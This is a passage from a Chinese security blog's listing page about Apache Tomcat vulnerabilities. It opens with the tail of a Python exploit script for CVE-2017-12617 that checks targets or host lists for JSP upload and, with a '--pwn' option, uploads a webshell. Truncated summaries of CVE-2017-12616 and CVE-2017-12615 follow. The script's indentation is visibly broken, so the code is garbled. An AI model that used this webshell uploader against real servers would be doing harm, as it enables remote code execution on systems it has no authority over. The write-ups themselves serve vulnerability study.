+ | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /   
+  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/    
+                                                                           
+                                                                           
+./cve-2017-12617.py [options]
+options:
+-u ,--url [::] check target url if it&#39;s vulnerable 
+-p,--pwn  [::] generate webshell and upload it
+-l,--list [::] hosts list
+[+]usage:
+./cve-2017-12617.py -u http://127.0.0.1
+./cve-2017-12617.py --url http://127.0.0.1
+./cve-2017-12617.py -u http://127.0.0.1 -p pwn
+./cve-2017-12617.py --url http://127.0.0.1 -pwn pwn
+./cve-2017-12617.py -l hotsts.txt
+./cve-2017-12617.py --list hosts.txt
+[@intx0x80]
+&quot;&quot;&quot;+bcolors.ENDC
+
+    )
+
+
+parse.add_option(&quot;-u&quot;,&quot;--url&quot;,dest=&quot;U&quot;,type=&quot;string&quot;,help=&quot;Website Url&quot;)          
+parse.add_option(&quot;-p&quot;,&quot;--pwn&quot;,dest=&quot;P&quot;,type=&quot;string&quot;,help=&quot;generate webshell and upload it&quot;)
+parse.add_option(&quot;-l&quot;,&quot;--list&quot;,dest=&quot;L&quot;,type=&quot;string&quot;,help=&quot;hosts File&quot;)
+
+(opt,args)=parse.parse_args()
+
+if opt.U==None and opt.P==None and opt.L==None:
+    print(parse.usage)
+    exit(0)
+
+
+
+else:
+    if opt.U!=None and opt.P==None and opt.L==None:
+        print bcolors.OKGREEN+banner+bcolors.ENDC 
+        url=str(opt.U)
+        checker=&quot;Poc.jsp&quot;
+        print bcolors.BOLD +&quot;Poc Filename  &#123;&#125;&quot;.format(checker)
+        createPayload(str(url)+&quot;/&quot;,checker)
+        con=getContent(str(url)+&quot;/&quot;,checker)
+        if &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39; in con:
+            print bcolors.WARNING+url+&#39; it\&#39;s Vulnerable to CVE-2017-12617&#39;+bcolors.ENDC
+        print bcolors.WARNING+url+&quot;/&quot;+checker+bcolors.ENDC
+        
+    else:
+            print &#39;Not Vulnerable to CVE-2017-12617 &#39;
+    elif opt.P!=None and opt.U!=None and  opt.L==None:
+                print bcolors.OKGREEN+banner+bcolors.ENDC 
+        pwn=str(opt.P)
+        url=str(opt.U)
+        print &quot;Uploading Webshell .....&quot;
+        pwn=pwn+&quot;.jsp&quot;
+        RCE(str(url)+&quot;/&quot;,pwn)
+        shell(str(url),pwn)
+    elif opt.L!=None and opt.P==None and opt.U==None:
+                print bcolors.OKGREEN+banner+bcolors.ENDC 
+        w=str(opt.L)
+        f=open(w,&quot;r&quot;)
+        print &quot;Scaning hosts in &#123;&#125;&quot;.format(w)
+        checker=&quot;Poc.jsp&quot;
+        for i in f.readlines():
+            i=i.strip(&quot;\n&quot;)
+            createPayload(str(i)+&quot;/&quot;,checker)
+            con=getContent(str(i)+&quot;/&quot;,checker)
+            if &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39; in con:
+                print str(i)+&quot;\033[91m&quot;+&quot; [ Vulnerable ] &quot;&quot;\033[0m&quot;
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Tomcat/%EF%BC%88CVE-2017-12617%EF%BC%89Tomcat%20RCE%20via%20JSP%20Upload%20Bypass/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Tomcat/%EF%BC%88CVE-2017-12617%EF%BC%89Tomcat%20RCE%20via%20JSP%20Upload%20Bypass/" data-id="cl5c2qwye00jay8v172xr75cc" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Tomcat/（CVE-2017-12616）Tomcat 信息泄露" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Tomcat/%EF%BC%88CVE-2017-12616%EF%BC%89Tomcat%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="article-date">
+  <time datetime="2022-07-08T06:26:05.515Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2017-12616）Tomcat-信息泄露"><a href="#（CVE-2017-12616）Tomcat-信息泄露" class="headerlink" title="（CVE-2017-12616）Tomcat 信息泄露"></a>（CVE-2017-12616）Tomcat 信息泄露</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>CVE-2017-12616(信息泄露):允许未经身份验证的远程攻击者查看敏感信息。如果tomcat开启VirtualDirContext有可能绕过安全限制访问服务器上的JSP文件源码。漏洞触发的先决条件是需要在conf/server.xml配置VirtualDirContex参数，默认情况下tomcat7并不会对该参数进行配置。</p>
+<p>那么为什么要配置一个这样的虚拟目录呢？</p>
+<p>通过<code>VirtualDirContext</code>,允许在单独的一个webapp应用下对外暴露出多个文件系统的目录。在实际开发中，为了避免拷贝静态资源文件如(images等)至webapp目录下，tomcat推荐的做法是在server.xml配置文件中建立虚拟子目录。</p>
+<p>在开启了这个配置之后，可以通过windows目录下的文件的解析问题，从而暴露在在目录中的源码。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Apache Tomcat 7.0.0 - 7.0.80</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞调试"><a href="#漏洞调试" class="headerlink" title="漏洞调试"></a>漏洞调试</h3>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Tomcat/%EF%BC%88CVE-2017-12616%EF%BC%89Tomcat%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Tomcat/%EF%BC%88CVE-2017-12616%EF%BC%89Tomcat%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" data-id="cl5c2qwyc00j8y8v12lqc3chf" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Tomcat/（CVE-2017-12615）Tomcat PUT方法任意文件写入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Tomcat/%EF%BC%88CVE-2017-12615%EF%BC%89Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:05.513Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2017-12615）Tomcat-PUT方法任意文件写入漏洞"><a href="#（CVE-2017-12615）Tomcat-PUT方法任意文件写入漏洞" class="headerlink" title="（CVE-2017-12615）Tomcat PUT方法任意文件写入漏洞"></a>（CVE-2017-12615）Tomcat PUT方法任意文件写入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法（例如，将<br>readonly 初始化参数由默认值设置为<br>false），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的<br>JSP 文件。之后，JSP 文件中的代码将能被服务器执行。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Apache Tomcat 7.0.0 – 7.0.81</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="1-环境搭建："><a href="#1-环境搭建：" class="headerlink" title="1.环境搭建："></a>1.环境搭建：</h4><p>（1)先安装jdk。（因为Tomcat需要java环境支持）</p>
+<p>jdk8下载地址<br><a target="_blank" rel="noopener" href="http://www.liangchan.net/soft/download.asp?softid=9366&downid=8&id=9430">http://www.liangchan.net/soft/download.asp?softid=9366&amp;downid=8&amp;id=9430<br>12</a></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Tomcat/%EF%BC%88CVE-2017-12615%EF%BC%89Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Tomcat/%EF%BC%88CVE-2017-12615%EF%BC%89Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qwzm00jhy8v1c9nj250z" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/31/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/30/">30</a><a class="page-number" href="/page/31/">31</a><span class="page-number current">32</span><a class="page-number" href="/page/33/">33</a><a class="page-number" href="/page/34/">34</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/33/">下一页</a>
+    </nav>
+  
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
